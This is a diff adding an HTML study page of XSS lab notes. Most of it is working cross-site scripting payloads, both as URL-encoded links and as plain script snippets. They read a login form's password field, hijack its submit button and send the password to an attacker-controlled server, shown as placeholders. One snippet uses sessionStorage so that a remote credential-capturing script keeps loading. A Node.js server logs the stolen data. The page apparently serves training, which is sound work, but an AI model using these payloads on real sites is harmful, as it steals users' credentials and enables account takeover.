@@ -1,0 +1,266 @@
+
+
+<html>
+
+
+<head>
+
+  <style>
+  body {
+    font-family: Verdana;
+    line-height: 1.5;
+  }
+
+  text-area {
+    margin: 20px 0;
+  }
+  </style>
+</head>
+
+
+<body>
+<h1>Notes</h1>
+
+  <ul>
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=Frank">XSS start page</a></li>
+
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=%3Cscript%20type=%22text/javascript%22%20src=%22https://code.jquery.com/jquery-3.5.1.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%3Efunction%20ajax()%20{var%20t=$(%27.m_login_password%27).val();%20$.ajax({type:%20%22GET%22,url:%20%27http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS ENABLED}/index.html%27,data:%20t});}%3C/script%3E%3Cscript%20type=%22text/javascript%22%3E$(%20document%20).ready(function()%20{$(%27.submit_btn%27).attr(%27onClick%27,%27ajax();%20return%20false;%27);});%3C/script%3E">XSS on CORS-enabled site</a></li>
+
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=%3Cscript%20type=%22text/javascript%22%20src=%22https://code.jquery.com/jquery-3.5.1.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%3Efunction%20ajax()%20{var%20t=$(%27.m_login_password%27).val();%20$.ajax({type:%20%22GET%22,url:%20%27http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/%27,data:%20t});}%3C/script%3E%3Cscript%20type=%22text/javascript%22%3E$(%20document%20).ready(function()%20{$(%27.submit_btn%27).attr(%27onClick%27,%27ajax();%20return%20false;%27);});%3C/script%3E">XSS on site with no CORS</a></li>
+
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=%3Cscript%20type=%22text/javascript%22%20src=%22https://code.jquery.com/jquery-3.5.1.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%3Efunction%20ajax()%20{var%20t=$(%27.m_login_password%27).val();%20$.ajax({type:%20%22GET%22,url:%20%27http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/%27,data:%20t,dataType:%22json%22});}%3C/script%3E%3Cscript%20type=%22text/javascript%22%3E$(%20document%20).ready(function()%20{$(%27.submit_btn%27).attr(%27onClick%27,%27ajax();%20return%20false;%27);});%3C/script%3E">XSS using JSON request</a></li>
+
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=%3Cscript%20type=%22text/javascript%22%20src=%22https://code.jquery.com/jquery-3.5.1.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%3Efunction%20ajax()%20{var%20t=$(%27.m_login_password%27).val();%20$.ajax({type:%20%22GET%22,url:%20%27http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/%27,data:%20t,dataType:%22jsonp%22});}%3C/script%3E%3Cscript%20type=%22text/javascript%22%3E$(%20document%20).ready(function()%20{$(%27.submit_btn%27).attr(%27onClick%27,%27ajax();%20return%20false;%27);});%3C/script%3E">XSS with JSONP request</a></li>
+
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/1-xss/index.php?name=%3Cscript%3EsessionStorage.setItem(%22visited%22,%20%22%3Cimg%20src%20onerror=%27%20var%20jquery=\%22https://code.jquery.com/jquery-3.5.1.min.js\%22;%20var%20theOtherScript=\%22http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS ENABLED}/script.js\%22;%20var%20el=document.createElement(\%22script\%22);%20el.async=false;%20el.src=theOtherScript;%20el.type=\%22text/javascript\%22;%20var%20eljq=document.createElement(\%22script\%22);%20eljq.async=false;%20eljq.src=jquery;%20eljq.type=\%22text/javascript\%22;%20(document.getElementsByTagName(\%22HEAD\%22)[0]||document.body).appendChild(eljq);%20(document.getElementsByTagName(\%22HEAD\%22)[0]||document.body).appendChild(el);%20%27%3E%20Good%20to%20see%20you%20again...%20%3C/div%3E%22);%3C/script%3E">XSS with persistent sessionStorage</a></li>
+
+    <li><a href="https://duckduckgo.com/?t=ffab&q=javascript+minifier&ia=answer">Tool - Online JS minifier</a></li>
+
+    <li><a href="https://nodejs.org">https://nodejs.org</a></li>
+    <li><a href="http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER}/server.js">server.js file for running local server with CORS enabled using node.js (command: node server.js)</a></li>
+  </ul>
+
+
+
+<hr/>
+<h2>XSS dot points</h2>
+
+<ul>
+<li>Malicious scripts are injected into otherwise benign and trusted websites</li>
+<li>Most common ways of getting XSS onto the victim's machine
+  <ul>
+    <li>Injected into third-party libraries  (js framework libraries, npm packages)</li>
+    <li>Injected onto a server and editing the web site html to load up the scripts, victims are now the clients who visit that server</li>
+    <li>Rendered dynamically onto the site due to poorly encoding (or none) configuration on a site, victims will be whomever access that site with dynamically referenced url (i.e. query strings -http://example.com/?name=frank)
+</ul>
+</ul>
+
+<hr/>
+
+<h2>JS snippet for CORS enabled</h2>
+
+<ul>
+  <li>Server configured to allow CORS (cross origin resources sharing)</li>
+  <li>^^ Meaning allows requests to resources on other servers</li>
+  <li> e.g. https://domain-a.com uses XMLHttpRequest to make a request for https://domain-b.com/data.json.</li>
+  <li>For this example, Apache webserver configured with: Header set Access-Control-Allow-Origin "*"</li>
+  <li>By default not enabled on most web server configurations</li>
+  <li>Can lock down the scope of CORS to specific urls, but tedious to maintain list if multiple sites targeted</li>
+
+
+</ul>
+
+<textarea cols="200" rows="25">
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript">
+function ajax() {
+
+  var t=$('.m_login_password').val();
+
+  $.ajax({
+        type: "GET",
+        url: 'http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS ENABLED}/index.html',
+        data: t
+      });
+  }
+
+$( document ).ready(function() {
+  $('.submit_btn').attr('onClick','ajax(); return false;');
+});
+
+</script>
+
+</textarea>
+<hr/>
+
+
+<h2>JS Snippet for site with no CORS</h2>
+
+<ul>
+  <li>Server not configured with CORS</li>
+  <li>^^ Meaning requests to the other server's resources won't work</li>
+  <li>The usual configuration for most webservers</li>
+  <li>So how to pass on captured data to attacking servers?</li>
+
+</ul>
+
+<textarea cols="200" rows="25">
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript">
+
+function ajax() {
+  var t=$('.m_login_password').val();
+  $.ajax({
+    type: "GET",
+    url: 'http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/',
+    data: t
+  });
+}
+
+$( document ).ready(function() {
+  $('.submit_btn').attr('onClick','ajax(); return false;');
+});
+</script>
+
+</textarea>
+
+<hr/>
+
+<h2>JS Snippet for JSON request </h2>
+
+<ul>
+  <li>JSON - Javascript Object Notation</li>
+  <li>Common data format used in front-end dev. Lightweight, quick to read and write, doesn't require parsers to sift through data (i.e. XML)</li>
+  <li>Making use of an AJAX (aysnc request) to pass on captured data to the attacking server - see if this works</li>
+</ul>
+
+
+<textarea cols="200" rows="25">
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript">
+function ajax() {
+  var t=$('.m_login_password').val();
+
+$.ajax({
+  type: "GET",
+  url: 'http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/',
+  data: t,
+  dataType:"json"
+  });
+}
+
+$( document ).ready(function() {
+  $('.submit_btn').attr('onClick','ajax(); return false;');
+});
+</script>
+
+</textarea>
+
+
+<h2>JS Snippet for JSONP request </h2>
+
+<ul>
+  <li>JSONP - JSON with Padding</li>
+  <li>As seen previously, attempting AJAX request with JSON did not work when attempting to send over data to the attacking server</li>
+  <li>JSONP is a method for sending JSON data without worrying about cross-domain issues.</li>
+  <li>JSONP is basically JSON wrapped around a callback function (user-defined), allowing for cross-domain requests to be made without modifying the webserver config</li>
+</ul>
+
+
+<textarea cols="200" rows="25">
+
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript">
+function ajax() {
+  var t=$('.m_login_password').val();
+
+$.ajax({
+  type: "GET",
+  url: 'http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS WITH "*" ACCESS}/',
+  data: t,
+  dataType:"jsonp"
+  });
+}
+
+$( document ).ready(function() {
+  $('.submit_btn').attr('onClick','ajax(); return false;');
+});
+</script>
+
+</textarea>
+
+
+<hr/>
+
+<h2>JS Snippet for persistent sessionStorage</h2>
+
+<ul>
+  <li>Creates a sessionStorage element</li>
+  <li>key/value pair in sessionStorage, has a value that contains the HTML of a broken &lt;img> tag with an 'onerror' event listener</li>
+  <li>^^ 'onerror' allows javascript to trigger upon an error with the element (the image tag), because the image is broken by default, js will trigger upon page render</li>
+  <li>event listener 'onerror' runs javascript that loads up a JQuery library plus 'script.js' on the attacking server (contains further handlers to alter the login form to allow capture creds off the login)</li>
+  <li>as sessionStorage element has now been created, it will remain persistent on the user's machine until removed (i.e. reload the site with no query parameters in the url, and the script still runs)</li>
+</ul>
+
+<textarea cols="200" rows="25">
+<script>
+sessionStorage.setItem("visited", "<img src onerror=' var jquery=\"https://code.jquery.com/jquery-3.5.1.min.js\"; var theOtherScript=\"http://{REPLACE WITH IP OF YOUR LAMP STACK SERVER THAT HAS CORS ENABLED}/script.js\"; var el=document.createElement(\"script\"); el.async=false; el.src=theOtherScript; el.type=\"text/javascript\"; var eljq=document.createElement(\"script\"); eljq.async=false; eljq.src=jquery; eljq.type=\"text/javascript\"; (document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(eljq); (document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(el); '> Good to see you again... </div>");
+</script>
+</textarea>
+
+
+
+<hr/>
+
+<h2>Running Node.js with local webserver with CORS enabled</h2>
+
+<li>Quick/easy way to try out requests with CORS</li>
+<li>Lightweight and easy to deploy</li>
+<li>Using Node.js command prompt, go to directory with server.js and run "node server.js"</li>
+<li>Can use examples above, just replace urls with localhost (127.0.0.1)</li>
+<li>Requests made will be shown in the console</li>
+<li>Node.js solution can be use as proper webserver (popular amongs front end developers due to native JS, usually complementing the dev's skill set)</li>
+<li>^^ other uses such as API delivery for object DBs (MongoDB), webapps, processing, real-time services (chat rooms etc.)</li>
+
+
+<textarea cols="200" rows="25">
+  var http = require('http');
+  http.createServer(function (req, res) {
+
+    const headers = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "OPTIONS, POST, GET",
+      "Access-Control-Max-Age": 2592000, // 30 days
+      /** add other headers as per requirement */
+    };
+
+
+    //res.writeHead(200, {'Content-Type': 'text/plain'});
+    //res.write('Hello World!');
+    res.writeHead(405, headers);
+    res.end();
+
+    console.log(req.url);
+  }).listen(80);
+
+
+
+</textarea>
+
+
+<hr/>
+
+<h2>Going forward / more complex steps</h2>
+
+
+<ul>
+  <li>Portswigger Acadamey - <a href="https://portswigger.net/">https://portswigger.net/</a></li>
+  <li>Encoding/decoding url params </li>
+  <li><a href="https://zixem.altervista.org/XSS/">https://zixem.altervista.org/XSS/</a></li>
+  <li><a href="https://overthewire.org/wargames/natas/">https://overthewire.org/wargames/natas/</a></li>
+</ul>
+</body>
+</html>
